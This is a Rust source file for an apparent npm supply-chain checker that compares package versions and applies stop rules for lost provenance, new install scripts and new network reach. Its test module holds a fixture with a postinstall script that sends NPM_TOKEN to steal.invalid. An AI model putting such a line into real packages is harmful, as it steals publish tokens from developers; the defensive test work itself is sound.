use crate::archive::{LoadedArchive, extract_manifest_facts};
use crate::canonical::{canonical_id, parse_rfc3339_unix, transition_subject};
use crate::history::{HistoryContext, evaluate_history};
use crate::model::{
    Anchor, ArtifactProfile, BreakKind, Decision, FileRole, LedgerEndpoint, LockAlarm,
    NewDirectPolicy, OriginClass, PolicyConfig, ReadPassPolicy, ReadingOutcome, ReferenceStanding,
    ReleaseAgeBand, StopRule, TOOL_VERSION, TransitionLedger, Verdict,
};
use crate::reach::{compute_reach_delta, detect_minified_new, scan_artifact_reach};
use crate::source::{SourceSnapshot, classify_files};
use std::collections::BTreeSet;

/// Builds a project-independent `ArtifactProfile` for one verified tarball.
pub fn build_artifact_profile(
    ecosystem: &str,
    name: &str,
    version: &str,
    archive: &LoadedArchive,
    anchor: Anchor,
    source: Option<&SourceSnapshot>,
) -> ArtifactProfile {
    let manifest = extract_manifest_facts(archive);
    let reach = scan_artifact_reach(archive, &manifest);
    let (files, _, _) = classify_files(archive, None, source);

    ArtifactProfile {
        kind: "artifact_profile".to_string(),
        schema: 1,
        ecosystem: ecosystem.to_string(),
        name: name.to_string(),
        version: version.to_string(),
        sha512: archive.inventory.sha512.clone(),
        compressed_bytes: archive.inventory.compressed_bytes,
        expanded_bytes: archive.inventory.expanded_bytes,
        file_count: archive.inventory.entries.len() as u64,
        archive_facts: archive.inventory.facts.clone(),
        anchor,
        manifest,
        reach: reach.tokens,
        hostnames: reach.hostnames,
        files,
        tool_version: TOOL_VERSION.to_string(),
    }
}

pub struct TransitionInput<'a> {
    pub ecosystem: &'a str,
    pub name: &'a str,
    pub reference_archive: Option<&'a LoadedArchive>,
    pub reference_profile: Option<&'a ArtifactProfile>,
    pub reference_standing: ReferenceStanding,
    pub reference_published_at: Option<String>,
    pub new_archive: &'a LoadedArchive,
    pub new_profile: &'a ArtifactProfile,
    pub new_source: Option<&'a SourceSnapshot>,
    pub new_published_at: Option<String>,
    pub lock_alarms: BTreeSet<LockAlarm>,
    pub history_ctx: HistoryContext,
    pub registry_snapshot_sha256: Option<String>,
}

/// Builds a timeless deterministic `TransitionLedger` (no `now` clock, no relative ages).
pub fn build_transition_ledger(input: TransitionInput<'_>) -> Result<(TransitionLedger, String), String> {
    let new_profile_id = canonical_id(input.new_profile)?;
    let ref_endpoint = match (input.reference_profile, input.reference_archive) {
        (Some(rp), Some(_)) => Some(LedgerEndpoint {
            version: rp.version.clone(),
            sha512: rp.sha512.clone(),
            profile_id: canonical_id(rp)?,
            standing: Some(input.reference_standing),
            published_at: input.reference_published_at.clone(),
        }),
        _ => None,
    };

    let subject = transition_subject(
        input.ecosystem,
        input.name,
        ref_endpoint.as_ref().map(|r| r.sha512.as_str()),
        &input.new_profile.sha512,
    );

    let (files, removed_files, totals) = classify_files(
        input.new_archive,
        input.reference_archive,
        input.new_source,
    );

    let mut non_carried_paths = BTreeSet::new();
    let mut unexplained_paths = BTreeSet::new();
    let mut unexplained_code_bytes = 0u64;
    let mut unexplained_non_exec_bytes = 0u64;

    for f in &files {
        if f.class != OriginClass::Carried {
            non_carried_paths.insert(f.path.clone());
        }
        if f.class == OriginClass::Unexplained {
            unexplained_paths.insert(f.path.clone());
            if matches!(f.role, FileRole::Declaration | FileRole::SourceMap | FileRole::Doc) {
                unexplained_non_exec_bytes += f.bytes;
            } else {
                unexplained_code_bytes += f.bytes;
            }
        }
    }

    let new_reach_full = scan_artifact_reach(input.new_archive, &input.new_profile.manifest);
    let ref_reach_full = match (input.reference_archive, input.reference_profile) {
        (Some(ra), Some(rp)) => Some(scan_artifact_reach(ra, &rp.manifest)),
        _ => None,
    };

    let mut reach_delta = compute_reach_delta(
        &new_reach_full,
        ref_reach_full.as_ref(),
        &non_carried_paths,
        &unexplained_paths,
    );

    if let (Some(ra), Some(rr)) = (input.reference_archive, ref_reach_full.as_ref()) {
        let ref_paths: BTreeSet<String> = ra
            .inventory
            .entries
            .iter()
            .map(|e| e.path.clone())
            .collect();
        detect_minified_new(
            &new_reach_full,
            rr,
            &ref_paths,
            &non_carried_paths,
            &unexplained_paths,
            &mut reach_delta,
        );
    }

    let history = evaluate_history(
        &input.history_ctx,
        &input.new_profile.anchor,
        &input.new_profile.manifest,
        &files,
        input.reference_profile,
    );

    let mut archive_facts = input.new_archive.inventory.facts.clone();
    if let Some(ra) = input.reference_archive {
        archive_facts.extend(ra.inventory.facts.iter().copied());
    }

    let ledger = TransitionLedger {
        kind: "ledger".to_string(),
        schema: 1,
        subject,
        ecosystem: input.ecosystem.to_string(),
        name: input.name.to_string(),
        reference: ref_endpoint,
        new: LedgerEndpoint {
            version: input.new_profile.version.clone(),
            sha512: input.new_profile.sha512.clone(),
            profile_id: new_profile_id,
            standing: None,
            published_at: input.new_published_at,
        },
        anchor: input.new_profile.anchor.clone(),
        lock_alarms: input.lock_alarms,
        archive_facts,
        files,
        removed_files,
        totals,
        unexplained_code_bytes,
        unexplained_non_exec_bytes,
        breaks: history.breaks,
        flags: history.flags,
        break_notes: history.notes,
        new_reach: reach_delta.new_reach,
        new_reach_in_unexplained: reach_delta.new_reach_in_unexplained,
        new_reach_files: reach_delta.new_reach_files,
        new_hostnames: reach_delta.new_hostnames,
        registry_snapshot_sha256: input.registry_snapshot_sha256,
        tool_version: TOOL_VERSION.to_string(),
    };

    let ledger_id = canonical_id(&ledger)?;
    Ok((ledger, ledger_id))
}

/// Evaluates policy stop rules `S1`–`S10` on a timeless `TransitionLedger` at explicit `as_of`.
pub fn evaluate_decision(
    ledger: &TransitionLedger,
    ledger_id: &str,
    policy: &PolicyConfig,
    as_of: &str,
    is_new_direct_dependency: bool,
    reading_outcome: ReadingOutcome,
    prior_approved_stop_rules: Option<&BTreeSet<StopRule>>,
) -> Decision {
    let published_age_hours = match (
        ledger.new.published_at.as_deref().and_then(parse_rfc3339_unix),
        parse_rfc3339_unix(as_of),
    ) {
        (Some(pub_u), Some(now_u)) => Some((now_u - pub_u) / 3600),
        _ => None,
    };

    let has_known_malicious = ledger.breaks.contains(&BreakKind::KnownMalicious);
    let age_band = match published_age_hours {
        Some(h) if h < policy.min_age_hours => ReleaseAgeBand::Fresh,
        Some(h) if h >= policy.settled_age_days * 24 && !has_known_malicious => {
            ReleaseAgeBand::Settled
        }
        Some(_) => ReleaseAgeBand::Recent,
        None => ReleaseAgeBand::Unknown,
    };

    let mut stop_rules = BTreeSet::new();
    let mut stop_reasons = Vec::new();

    // S1: Missing SHA-512 integrity
    if ledger.lock_alarms.contains(&LockAlarm::IntegrityMissing) {
        stop_rules.insert(StopRule::S1);
        stop_reasons.push("S1: new artifact has no SHA-512 integrity".to_string());
    }

    // S2: Other lock alarms
    let other_alarms: Vec<&LockAlarm> = ledger
        .lock_alarms
        .iter()
        .filter(|&&a| a != LockAlarm::IntegrityMissing)
        .collect();
    if !other_alarms.is_empty() {
        stop_rules.insert(StopRule::S2);
        stop_reasons.push(format!("S2: lock alarms: {other_alarms:?}"));
    }

    // S3: Archive facts
    if !ledger.archive_facts.is_empty() {
        stop_rules.insert(StopRule::S3);
        stop_reasons.push(format!("S3: archive anomalies: {:?}", ledger.archive_facts));
    }

    // S4: Stop-severity breaks
    if !ledger.breaks.is_empty() {
        stop_rules.insert(StopRule::S4);
        for b in &ledger.breaks {
            let note = ledger
                .break_notes
                .get(b)
                .map(|s| format!(" ({s})"))
                .unwrap_or_default();
            stop_reasons.push(format!("S4: break {b:?}{note}"));
        }
    }

    // S5: New direct dependency
    if is_new_direct_dependency && policy.new_direct_dependency == NewDirectPolicy::Confirm {
        stop_rules.insert(StopRule::S5);
        stop_reasons.push("S5: new direct dependency requires human confirmation".to_string());
    }

    // S6: Unexplained bytes and no anchor (unless settled)
    let has_unexplained = ledger
        .totals
        .get(&OriginClass::Unexplained)
        .map(|t| t.files > 0)
        .unwrap_or(false);
    if has_unexplained && !ledger.anchor.found && age_band != ReleaseAgeBand::Settled {
        stop_rules.insert(StopRule::S6);
        stop_reasons.push("S6: unexplained bytes with no source anchor".to_string());
    }

    // S7: New high reach token, or any new reach token inside unexplained bytes
    let new_high_reach: Vec<_> = ledger.new_reach.iter().filter(|t| t.is_high()).collect();
    if !new_high_reach.is_empty() || !ledger.new_reach_in_unexplained.is_empty() {
        stop_rules.insert(StopRule::S7);
        stop_reasons.push(format!(
            "S7: new reach high={new_high_reach:?} in_unexplained={:?}",
            ledger.new_reach_in_unexplained
        ));
    }

    let reading_required = has_unexplained || !ledger.flags.is_empty() || !ledger.new_reach.is_empty();

    // S8: Reading required and did not pass
    if reading_required && reading_outcome != ReadingOutcome::Passed {
        stop_rules.insert(StopRule::S8);
        stop_reasons.push(format!(
            "S8: reading required (outcome={reading_outcome:?})"
        ));
    }

    // S9: Fresh release (< min_age) and would otherwise be `read`
    if age_band == ReleaseAgeBand::Fresh && reading_required {
        stop_rules.insert(StopRule::S9);
        stop_reasons.push(format!(
            "S9: release is fresh ({}h < {}h) and not fully explained",
            published_age_hours.unwrap_or(0),
            policy.min_age_hours
        ));
    }

    // S10: Stale approval (new stop reasons appeared since approval)
    if let Some(approved_rules) = prior_approved_stop_rules {
        if !stop_rules.is_subset(approved_rules) {
            stop_rules.insert(StopRule::S10);
            stop_reasons.push("S10: new stop reasons appeared since prior approval".to_string());
        }
    }

    let verdict = if !stop_rules.is_empty() {
        Verdict::Stop
    } else if !reading_required {
        Verdict::Explained
    } else if policy.read_pass == ReadPassPolicy::RequireHuman {
        Verdict::Stop
    } else {
        Verdict::Read
    };

    Decision {
        kind: "decision".to_string(),
        schema: 1,
        ledger_id: ledger_id.to_string(),
        subject: ledger.subject.clone(),
        as_of: as_of.to_string(),
        policy_version: policy.policy_version,
        published_age_hours,
        age_band,
        reading_required,
        reading_outcome: if reading_required {
            reading_outcome
        } else {
            ReadingOutcome::NotRequired
        },
        stop_rules,
        stop_reasons,
        verdict,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::archive::inspect_tgz;
    use crate::history::ReleaseMetaSummary;
    use crate::model::{AnchorMethod, ArchiveLimits, BreakKind, ReachToken};
    use flate2::Compression;
    use flate2::write::GzEncoder;
    use std::collections::BTreeMap;
    use std::io::Write;

    fn make_tgz(files: &[(&str, &[u8])]) -> Vec<u8> {
        let mut tar = Vec::new();
        for (name, data) in files {
            let mut hdr = [0u8; 512];
            let nb = name.as_bytes();
            hdr[..nb.len()].copy_from_slice(nb);
            hdr[100..108].copy_from_slice(b"0000644\0");
            hdr[108..116].copy_from_slice(b"0000000\0");
            hdr[116..124].copy_from_slice(b"0000000\0");
            let size_oct = format!("{:011o}\0", data.len());
            hdr[124..136].copy_from_slice(size_oct.as_bytes());
            hdr[136..148].copy_from_slice(b"00000000000\0");
            hdr[148..156].copy_from_slice(b"        ");
            hdr[156] = b'0';
            hdr[257..263].copy_from_slice(b"ustar\0");
            hdr[263..265].copy_from_slice(b"00");
            let csum: u32 = hdr.iter().map(|&b| b as u32).sum();
            let csum_oct = format!("{csum:06o}\0 ");
            hdr[148..156].copy_from_slice(csum_oct.as_bytes());
            tar.extend_from_slice(&hdr);
            tar.extend_from_slice(data);
            let pad = (512 - (data.len() % 512)) % 512;
            tar.extend(std::iter::repeat_n(0u8, pad));
        }
        tar.extend(std::iter::repeat_n(0u8, 1024));
        let mut enc = GzEncoder::new(Vec::new(), Compression::default());
        enc.write_all(&tar).unwrap();
        enc.finish().unwrap()
    }

    fn anchored(commit: &str) -> Anchor {
        Anchor {
            found: true,
            commit: Some(commit.to_string()),
            method: Some(AnchorMethod::ProvenanceAsserted),
            methods_tried: vec!["provenance".into()],
            conflict: false,
            conflict_details: Vec::new(),
            repository_url: Some("https://github.com/org/pkg".into()),
            repository_directory: None,
            workflow_path: None,
            workflow_ref: None,
            reachable_from_branch: Some(true),
        }
    }

    fn unanchored() -> Anchor {
        Anchor {
            found: false,
            commit: None,
            method: None,
            methods_tried: vec!["provenance".into(), "gitHead".into(), "tag".into()],
            conflict: false,
            conflict_details: Vec::new(),
            repository_url: Some("https://github.com/org/pkg".into()),
            repository_directory: None,
            workflow_path: None,
            workflow_ref: None,
            reachable_from_branch: None,
        }
    }

    #[test]
    fn timeless_ledger_separates_fresh_and_recent_decisions() {
        let ref_tgz = make_tgz(&[
            ("package/package.json", br#"{"name":"demo","version":"1.0.0"}"#),
            ("package/dist.js", b"export const a = 1;\n"),
        ]);
        let new_tgz = make_tgz(&[
            ("package/package.json", br#"{"name":"demo","version":"1.0.1"}"#),
            ("package/dist.js", b"export const a = 2;\n"),
        ]);
        let ref_arch = inspect_tgz(&ref_tgz, None, ArchiveLimits::default()).unwrap();
        let new_arch = inspect_tgz(&new_tgz, None, ArchiveLimits::default()).unwrap();

        let ref_prof = build_artifact_profile("npm", "demo", "1.0.0", &ref_arch, anchored("aaa"), None);
        let new_prof = build_artifact_profile("npm", "demo", "1.0.1", &new_arch, anchored("bbb"), None);

        let (ledger, ledger_id) = build_transition_ledger(TransitionInput {
            ecosystem: "npm",
            name: "demo",
            reference_archive: Some(&ref_arch),
            reference_profile: Some(&ref_prof),
            reference_standing: ReferenceStanding::Admitted,
            reference_published_at: Some("2026-10-01T00:00:00Z".into()),
            new_archive: &new_arch,
            new_profile: &new_prof,
            new_source: None,
            new_published_at: Some("2026-11-19T20:00:00Z".into()),
            lock_alarms: BTreeSet::new(),
            history_ctx: HistoryContext {
                prior_releases: vec![],
                new_release: ReleaseMetaSummary {
                    version: "1.0.1".into(),
                    published_at: Some("2026-11-19T20:00:00Z".into()),
                    ..Default::default()
                },
                reference_had_anchor: Some(true),
                ..Default::default()
            },
            registry_snapshot_sha256: Some("deadbeef".into()),
        })
        .unwrap();

        let policy = PolicyConfig::default();
        // 3 hours later: fresh -> S9 stops even if reading passed
        let fresh = evaluate_decision(
            &ledger,
            &ledger_id,
            &policy,
            "2026-11-19T23:00:00Z",
            false,
            ReadingOutcome::Passed,
            None,
        );
        assert_eq!(fresh.verdict, Verdict::Stop);
        assert!(fresh.stop_rules.contains(&StopRule::S9));

        // 30 hours later: recent -> same ledger_id passes as Read when reading passed
        let recent = evaluate_decision(
            &ledger,
            &ledger_id,
            &policy,
            "2026-11-21T02:00:00Z",
            false,
            ReadingOutcome::Passed,
            None,
        );
        assert_eq!(recent.verdict, Verdict::Read);
        assert!(recent.stop_rules.is_empty());
        assert_eq!(fresh.ledger_id, recent.ledger_id);
    }

    #[test]
    fn stolen_token_style_release_stops_deterministically() {
        let ref_pkg = br#"{"name":"demo","version":"1.0.0","repository":"org/pkg"}"#;
        let ref_js = b"export const ok = true;\n";
        let ref_tgz = make_tgz(&[
            ("package/package.json", ref_pkg),
            ("package/index.js", ref_js),
        ]);
        let evil_pkg = br#"{"name":"demo","version":"1.0.1","repository":"org/pkg","scripts":{"postinstall":"node index.js"}}"#;
        let evil_js = b"const cp = require('child_process'); fetch('https://steal.invalid/' + process.env.NPM_TOKEN);\n";
        let new_tgz = make_tgz(&[
            ("package/package.json", evil_pkg),
            ("package/index.js", evil_js),
        ]);

        let ref_arch = inspect_tgz(&ref_tgz, None, ArchiveLimits::default()).unwrap();
        let new_arch = inspect_tgz(&new_tgz, None, ArchiveLimits::default()).unwrap();

        // Reference matched source completely
        let mut tree = BTreeMap::new();
        let mut blobs = BTreeMap::new();
        let pkg_sha1 = crate::digest::git_blob_sha1_hex(ref_pkg);
        let js_sha1 = crate::digest::git_blob_sha1_hex(ref_js);
        tree.insert("package.json".into(), pkg_sha1.clone());
        tree.insert("index.js".into(), js_sha1.clone());
        blobs.insert(pkg_sha1, ref_pkg.to_vec());
        blobs.insert(js_sha1, ref_js.to_vec());
        let ref_src = SourceSnapshot {
            tree_blob_sha1: tree,
            blobs_by_sha1: blobs,
            package_dir: None,
        };

        let ref_prof = build_artifact_profile("npm", "demo", "1.0.0", &ref_arch, anchored("aaa"), Some(&ref_src));
        let new_prof = build_artifact_profile("npm", "demo", "1.0.1", &new_arch, unanchored(), None);

        let (ledger, ledger_id) = build_transition_ledger(TransitionInput {
            ecosystem: "npm",
            name: "demo",
            reference_archive: Some(&ref_arch),
            reference_profile: Some(&ref_prof),
            reference_standing: ReferenceStanding::Admitted,
            reference_published_at: Some("2026-10-01T00:00:00Z".into()),
            new_archive: &new_arch,
            new_profile: &new_prof,
            new_source: None,
            new_published_at: Some("2026-11-19T20:00:00Z".into()),
            lock_alarms: BTreeSet::new(),
            history_ctx: HistoryContext {
                prior_releases: vec![ReleaseMetaSummary {
                    version: "1.0.0".into(),
                    has_provenance: true,
                    has_git_head: true,
                    repository_url: Some("https://github.com/org/pkg".into()),
                    ..Default::default()
                }],
                new_release: ReleaseMetaSummary {
                    version: "1.0.1".into(),
                    has_provenance: false,
                    ..Default::default()
                },
                reference_had_anchor: Some(true),
                ..Default::default()
            },
            registry_snapshot_sha256: Some("abc".into()),
        })
        .unwrap();

        assert!(ledger.breaks.contains(&BreakKind::AnchorLost));
        assert!(ledger.breaks.contains(&BreakKind::ProvenanceLost));
        assert!(ledger.breaks.contains(&BreakKind::SourceMatchDrop));
        assert!(ledger.breaks.contains(&BreakKind::InstallScriptNew));
        assert!(ledger.new_reach.contains(&ReachToken::Proc));
        assert!(ledger.new_reach.contains(&ReachToken::Net));
        assert!(ledger.new_reach.contains(&ReachToken::Env));
        assert!(ledger.new_hostnames.contains("steal.invalid"));

        let dec = evaluate_decision(
            &ledger,
            &ledger_id,
            &PolicyConfig::default(),
            "2026-11-22T00:00:00Z",
            false,
            ReadingOutcome::NotRun,
            None,
        );
        assert_eq!(dec.verdict, Verdict::Stop);
        assert!(dec.stop_rules.contains(&StopRule::S4));
        assert!(dec.stop_rules.contains(&StopRule::S6));
        assert!(dec.stop_rules.contains(&StopRule::S7));
    }
}
